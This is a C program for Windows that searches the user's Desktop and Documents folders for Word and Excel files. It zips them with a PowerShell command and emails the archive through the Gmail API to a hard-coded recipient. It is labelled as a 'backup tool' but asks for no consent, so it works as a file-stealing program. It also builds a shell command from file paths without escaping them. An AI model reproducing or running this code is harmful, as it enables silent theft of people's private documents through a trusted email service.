#define _CRT_SECURE_NO_WARNINGS
#include <windows.h>
#include <shlobj.h>
#include <stdio.h>
#include <wchar.h>
#include <locale.h>
#include <stdlib.h>
#include <string.h>

#include <winhttp.h>
#pragma comment(lib, "winhttp.lib")

#include <wincrypt.h>
#pragma comment(lib, "crypt32.lib")

#define CLIENT_ID "xxx"
#define CLIENT_SECRET "xxx"
#define REFRESH_TOKEN "xxx"

#define GMAIL_TO "xxxx"

typedef struct
{
    wchar_t **files;
    size_t count;
} fileList;

fileList g_filelist = {0};

void addFile(const wchar_t *path)
{

    wchar_t **temp;
    size_t len;

    temp = realloc(
        g_filelist.files,
        (g_filelist.count + 1) * sizeof(wchar_t *));

    if (temp == NULL)
        return;

    g_filelist.files = temp;

    len = wcslen(path) + 1;
    g_filelist.files[g_filelist.count] = malloc(len * sizeof(wchar_t));

    if (g_filelist.files[g_filelist.count] == NULL)
        return;

    wcscpy(g_filelist.files[g_filelist.count], path);
    g_filelist.count++;
}

void freeFileList(fileList *list)
{
    if (list == NULL)
        return;

    if (list->files == NULL)
        return;

    // free tung file
    for (int i = 0; i < list->count; i++)
    {
        free(list->files[i]);
    }

    // free mang chua cac file
    free(list->files);

    // reset
    list->files = NULL;
    list->count = 0;
}

void scanFolder(const wchar_t *folderPath)
{
    wchar_t searchPath[MAX_PATH];
    WIN32_FIND_DATAW findData;
    HANDLE hFind;

    // Folder
    swprintf(searchPath, MAX_PATH, L"%s\\*", folderPath);

    hFind = FindFirstFileW(searchPath, &findData);
    if (hFind == INVALID_HANDLE_VALUE)
        return;

    do
    {
        if (_wcsicmp(findData.cFileName, L".") == 0 || _wcsicmp(findData.cFileName, L"..") == 0)
        {
            continue;
        }

        wchar_t fullPath[MAX_PATH];
        swprintf(fullPath, MAX_PATH, L"%s\\%s", folderPath, findData.cFileName);

        // folder thi de quy
        if (findData.dwFileAttributes & FILE_ATTRIBUTE_DIRECTORY)
        {
            scanFolder(fullPath);
        }
        else
        {
            // la file thi check duoi file
            size_t len = wcslen(findData.cFileName);

            if (len > 5)
            {
                if (_wcsicmp(findData.cFileName + len - 5, L".docx") == 0 ||
                    _wcsicmp(findData.cFileName + len - 5, L".xlsx") == 0)
                {
                    wprintf(L"[FOUND] %s\n", fullPath);
                    addFile(fullPath);
                }
            }
        }
    } while (FindNextFileW(hFind, &findData));

    FindClose(hFind);
}

void zipFileWithPowerShell(fileList *list)
{
    wchar_t command[8192];

    if (list->count == 0)
        return;

    // start command
    wcscpy(command, L"powershell -Command \"Compress-Archive -Path ");

    // noi tung file
    for (int i = 0; i < list->count; i++)
    {
        wcscat(command, L"'");
        wcscat(command, list->files[i]);
        wcscat(command, L"'");

        if (i < list->count - 1)
            wcscat(command, L",");
    }

    // end command
    wcscat(command, L" -DestinationPath 'result.zip' -Force\"");

    // run
    _wsystem(command);
}

// =========================== HTTP READ ALL ===========================
static char *winhttp_read_all(HINTERNET hRequest)
{
    DWORD dwSize = 0;
    char *data = NULL;
    size_t total = 0;

    for (;;)
    {
        dwSize = 0;
        if (!WinHttpQueryDataAvailable(hRequest, &dwSize))
            break;
        if (dwSize == 0)
            break;

        char *newbuf = (char *)realloc(data, total + dwSize + 1);
        if (!newbuf)
        {
            free(data);
            return NULL;
        }
        data = newbuf;

        DWORD dwDownloaded = 0;
        if (!WinHttpReadData(hRequest, data + total, dwSize, &dwDownloaded))
        {
            free(data);
            return NULL;
        }
        total += dwDownloaded;
        data[total] = 0;
    }
    if (!data)
    {
        data = (char *)malloc(1);
        if (data)
            data[0] = 0;
    }
    return data;
}

// =========================== BASE64 / BASE64URL ===========================
static char *base64Encode(const BYTE *data, DWORD len)
{
    DWORD outLen = 0;
    if (!CryptBinaryToStringA(data, len, CRYPT_STRING_BASE64 | CRYPT_STRING_NOCRLF, NULL, &outLen))
        return NULL;

    char *out = (char *)malloc(outLen + 1);
    if (!out)
        return NULL;

    if (!CryptBinaryToStringA(data, len, CRYPT_STRING_BASE64 | CRYPT_STRING_NOCRLF, out, &outLen))
    {
        free(out);
        return NULL;
    }
    out[outLen] = 0;
    return out;
}

static void base64_to_base64url_inplace(char *s)
{
    // replace + -> -, / -> _, remove =
    char *p = s;
    char *q = s;
    while (*p)
    {
        if (*p == '+')
            *q++ = '-';
        else if (*p == '/')
            *q++ = '_';
        else if (*p == '=')
        {
            p++;
            continue;
        }
        else
            *q++ = *p;
        p++;
    }
    *q = 0;
}

static char *base64UrlEncode(const BYTE *data, DWORD len)
{
    char *b64 = base64Encode(data, len);
    if (!b64)
        return NULL;
    base64_to_base64url_inplace(b64);
    return b64;
}

// =========================== OAUTH REFRESH ===========================
BOOL refreshAccessToken(char *outToken, DWORD outSize)
{
    BOOL ok = FALSE;
    HINTERNET hSession = NULL, hConnect = NULL, hRequest = NULL;

    hSession = WinHttpOpen(L"BackupTool/1.0",
                           WINHTTP_ACCESS_TYPE_DEFAULT_PROXY,
                           WINHTTP_NO_PROXY_NAME,
                           WINHTTP_NO_PROXY_BYPASS, 0);
    if (!hSession)
        goto cleanup;

    hConnect = WinHttpConnect(hSession, L"oauth2.googleapis.com", INTERNET_DEFAULT_HTTPS_PORT, 0);
    if (!hConnect)
        goto cleanup;

    hRequest = WinHttpOpenRequest(hConnect, L"POST", L"/token",
                                  NULL, WINHTTP_NO_REFERER, WINHTTP_DEFAULT_ACCEPT_TYPES, WINHTTP_FLAG_SECURE);
    if (!hRequest)
        goto cleanup;

    char postData[2048];
    snprintf(postData, sizeof(postData),
             "client_id=%s&client_secret=%s&refresh_token=%s&grant_type=refresh_token",
             CLIENT_ID, CLIENT_SECRET, REFRESH_TOKEN);

    WinHttpAddRequestHeaders(hRequest,
                             L"Content-Type: application/x-www-form-urlencoded\r\n",
                             -1, WINHTTP_ADDREQ_FLAG_ADD | WINHTTP_ADDREQ_FLAG_REPLACE);

    if (!WinHttpSendRequest(hRequest, WINHTTP_NO_ADDITIONAL_HEADERS, 0,
                            postData, (DWORD)strlen(postData), (DWORD)strlen(postData), 0))
        goto cleanup;

    if (!WinHttpReceiveResponse(hRequest, NULL))
        goto cleanup;

    char *resp = winhttp_read_all(hRequest);
    if (!resp)
        goto cleanup;

    printf("OAuth response: %s\n", resp);

    // Robust parse: find "access_token" then find next quote after colon
    char *p = strstr(resp, "\"access_token\"");
    if (!p)
    {
        free(resp);
        goto cleanup;
    }

    p = strchr(p, ':');
    if (!p)
    {
        free(resp);
        goto cleanup;
    }
    p++;

    while (*p == ' ' || *p == '\"')
        p++;
    char *q = strchr(p, '\"');
    if (!q)
    {
        free(resp);
        goto cleanup;
    }

    size_t len = (size_t)(q - p);
    if (len == 0 || len >= outSize)
    {
        free(resp);
        goto cleanup;
    }

    strncpy(outToken, p, len);
    outToken[len] = 0;

    free(resp);
    ok = TRUE;

cleanup:
    if (hRequest)
        WinHttpCloseHandle(hRequest);
    if (hConnect)
        WinHttpCloseHandle(hConnect);
    if (hSession)
        WinHttpCloseHandle(hSession);
    return ok;
}

// =========================== MIME BUILD ===========================
char *buildMimeWithZip(const char *zipPath)
{
    FILE *f = fopen(zipPath, "rb");
    if (!f)
        return NULL;

    fseek(f, 0, SEEK_END);
    long size = ftell(f);
    rewind(f);

    if (size <= 0)
    {
        fclose(f);
        return NULL;
    }

    BYTE *zipData = (BYTE *)malloc((size_t)size);
    if (!zipData)
    {
        fclose(f);
        return NULL;
    }

    fread(zipData, 1, (size_t)size, f);
    fclose(f);

    // IMPORTANT: attachment uses BASE64 (NOT base64url)
    char *zipB64 = base64Encode(zipData, (DWORD)size);
    free(zipData);
    if (!zipB64)
        return NULL;

    const char *boundary = "BOUNDARY123";

    // NOTE: This base64 has NOCRLF; usually Gmail accepts. If later need strict MIME, we'll wrap at 76 chars.
    size_t need = 200000 + strlen(zipB64);
    char *mime = (char *)malloc(need);
    if (!mime)
    {
        free(zipB64);
        return NULL;
    }

    snprintf(mime, need,
             "From: me\r\n"
             "To: %s\r\n"
             "Subject: Backup File\r\n"
             "MIME-Version: 1.0\r\n"
             "Content-Type: multipart/mixed; boundary=\"%s\"\r\n"
             "\r\n"
             "--%s\r\n"
             "Content-Type: text/plain; charset=\"UTF-8\"\r\n"
             "\r\n"
             "Attached is backup file.\r\n"
             "\r\n"
             "--%s\r\n"
             "Content-Type: application/zip\r\n"
             "Content-Disposition: attachment; filename=\"result.zip\"\r\n"
             "Content-Transfer-Encoding: base64\r\n"
             "\r\n"
             "%s\r\n"
             "--%s--\r\n",
             GMAIL_TO, boundary,
             boundary, boundary, zipB64, boundary);

    free(zipB64);
    return mime;
}

// =========================== SEND GMAIL ===========================
BOOL sendMail(const char *accessToken, const char *mimeText)
{
    BOOL ok = FALSE;
    HINTERNET hSession = NULL, hConnect = NULL, hRequest = NULL;

    // IMPORTANT: Gmail API expects raw = base64url(MIME)
    char *raw = base64UrlEncode((const BYTE *)mimeText, (DWORD)strlen(mimeText));
    if (!raw)
        return FALSE;

    // JSON size depends on raw length -> allocate dynamically to avoid overflow
    size_t jsonNeed = strlen(raw) + 64;
    char *json = (char *)malloc(jsonNeed);
    if (!json)
    {
        free(raw);
        return FALSE;
    }

    snprintf(json, jsonNeed, "{\"raw\":\"%s\"}", raw);
    free(raw);

    hSession = WinHttpOpen(L"BackupTool/1.0",
                           WINHTTP_ACCESS_TYPE_DEFAULT_PROXY,
                           WINHTTP_NO_PROXY_NAME,
                           WINHTTP_NO_PROXY_BYPASS, 0);
    if (!hSession)
        goto cleanup;

    hConnect = WinHttpConnect(hSession, L"gmail.googleapis.com", INTERNET_DEFAULT_HTTPS_PORT, 0);
    if (!hConnect)
        goto cleanup;

    hRequest = WinHttpOpenRequest(hConnect, L"POST",
                                  L"/gmail/v1/users/me/messages/send",
                                  NULL, WINHTTP_NO_REFERER,
                                  WINHTTP_DEFAULT_ACCEPT_TYPES,
                                  WINHTTP_FLAG_SECURE);
    if (!hRequest)
        goto cleanup;

    wchar_t auth[4096];
    swprintf(auth, 4096, L"Authorization: Bearer %S\r\n", accessToken);
    wprintf(L"AUTH HEADER = %ls\n", auth);

    // Use REPLACE to ensure header is actually present
    WinHttpAddRequestHeaders(hRequest, auth, -1,
                             WINHTTP_ADDREQ_FLAG_ADD | WINHTTP_ADDREQ_FLAG_REPLACE);

    WinHttpAddRequestHeaders(hRequest,
                             L"Content-Type: application/json\r\n",
                             -1, WINHTTP_ADDREQ_FLAG_ADD | WINHTTP_ADDREQ_FLAG_REPLACE);

    if (!WinHttpSendRequest(hRequest,
                            WINHTTP_NO_ADDITIONAL_HEADERS, 0,
                            json, (DWORD)strlen(json),
                            (DWORD)strlen(json), 0))
        goto cleanup;

    if (!WinHttpReceiveResponse(hRequest, NULL))
        goto cleanup;

    DWORD status = 0, statusSize = sizeof(status);
    if (WinHttpQueryHeaders(hRequest,
                            WINHTTP_QUERY_STATUS_CODE | WINHTTP_QUERY_FLAG_NUMBER,
                            NULL, &status, &statusSize, NULL))
    {
        printf("Gmail status: %lu\n", status);
    }

    char *resp = winhttp_read_all(hRequest);
    if (resp)
    {
        printf("Gmail response: %s\n", resp);
        free(resp);
    }

    ok = (status == 200);

cleanup:
    free(json);
    if (hRequest)
        WinHttpCloseHandle(hRequest);
    if (hConnect)
        WinHttpCloseHandle(hConnect);
    if (hSession)
        WinHttpCloseHandle(hSession);
    return ok;
}

int wmain(void)
{

    setlocale(LC_ALL, "");

    wchar_t desktopPath[MAX_PATH];
    wchar_t documentsPath[MAX_PATH];

    // lay Desktop
    SHGetFolderPathW(NULL, CSIDL_DESKTOPDIRECTORY, NULL, 0, desktopPath);
    wprintf(L"Scanning Desktop:\n%s\n\n", desktopPath);
    scanFolder(desktopPath);

    // lay Document
    SHGetFolderPathW(NULL, CSIDL_PERSONAL, NULL, 0, documentsPath);
    wprintf(L"Scanning Documents:\n%s\n\n", documentsPath);
    scanFolder(documentsPath);

    wprintf(L"\nTotal files found: %zu\n", g_filelist.count);

    zipFileWithPowerShell(&g_filelist);

    // send mail
    char accessToken[4096];
    if (!refreshAccessToken(accessToken, sizeof(accessToken)))
    {
        wprintf(L"Failed to refresh access token\n");
        freeFileList(&g_filelist);
        system("pause");
        return 1;
    }

    printf("Access token OK (len=%zu)\n", strlen(accessToken));

    char *mime = buildMimeWithZip("result.zip");
    if (!mime)
    {
        wprintf(L"Failed to build MIME\n");
        freeFileList(&g_filelist);
        system("pause");
        return 1;
    }

    BOOL sent = sendMail(accessToken, mime);
    free(mime);

    freeFileList(&g_filelist);

    wprintf(L"\nDone, sent=%d\n", sent ? 1 : 0);
    system("pause");
    return sent ? 0 : 1;
}